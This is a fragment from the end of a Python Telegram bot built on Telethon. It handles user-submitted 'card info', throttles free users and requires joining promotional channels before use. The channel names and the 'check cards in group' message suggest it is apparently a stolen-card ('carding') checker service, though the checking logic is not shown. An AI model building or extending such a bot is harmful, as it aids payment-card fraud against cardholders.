                                await replyer.edit('**' + response + accounter + '**', buttons=[
                                    Button.url('RXS', 'https://telegram.me/Rxsbotupdates')
                                ])
                                spam_holder[str(sender)] = current_time
                                print('check21')
                            else:
                                await event.reply("**Since, you are a free user. \n\nTry again after **" + str(60-(current_time - checker)) + " **Seconds**")
                    else:
                        await event.reply('**Please enter the card info in correct format.**')
                except:
                    response = '**An Error Occured. \nPlease try again after some time.**'
                    await event.reply(response)
            else:
                full = await client(GetFullUserRequest(sender))
                name = str(full.user.first_name)
                userid = str(sender)
                await event.reply('**Hello! **' + f"[{name}](tg://user?id={userid})" + '\nYou are not subscribed to my channel. Please join my channel before accessing me.' , buttons=[
                    Button.url('Join Channel', 'https://telegram.me/Rxsbotupdates')
                ])
        elif (((sender in ssender) and (sender not in premium_users)) and str(event.raw_text[0:3])) in commands:
            full = await client(GetFullUserRequest(sender))
            name = str(full.user.first_name)
            userid = str(sender)
            await event.reply('**Hello! **' + f"[{name}](tg://user?id={userid})" + '\nYou are not authorised to use me inbox. please check cards in group.' , buttons=[
                    Button.url('Group', 'https://telegram.me/redxskullchecks')
                ])




client.run_until_disconnected()
